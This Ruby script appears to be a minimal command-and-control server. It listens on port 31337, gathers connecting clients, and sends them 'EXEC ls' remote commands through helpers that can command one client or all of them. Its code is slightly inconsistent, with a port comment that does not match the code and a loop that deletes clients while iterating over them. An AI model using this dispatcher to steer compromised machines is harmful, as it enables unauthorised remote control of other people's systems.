#!/usr/bin/env ruby
require 'socket'

class Server
  def initialize
    @clients = []
    @port = "31337"

    start_listener

    10.times do
      puts "[-] closing all connections"
      @clients.each do |client|
        command_client(client, "ls")
        puts "  - closing connection"
        client.close
        @clients.delete(client)
      end

      sleep(2)
    end
  end

  def start_listener
    puts "[*] starting listener"
    server = TCPServer.open(@port)   # Socket to listen on port 2000
    Thread.new {
      loop do                         # Servers run forever
        Thread.start(server.accept) do |client|
          puts "[+] accepted client"
          add_client client
        end
      end
    }
  end

  def add_client(client)
    puts "[+] adding new client"
    @clients << client
  end

  def remove_client(client)
    puts "Removing client #{client}"
    @clients.delete(client)
  end

  def list_clients
    @clients.each do |client|
      puts client
    end
  end

  def command_all_clients(command)
    @clients.each do |client|
      command_client(client, command)
    end
  end

  def command_client(client, command)
    client.puts("EXEC " << command)
    result = client.gets
    puts result.chop
  end
end

s = Server.new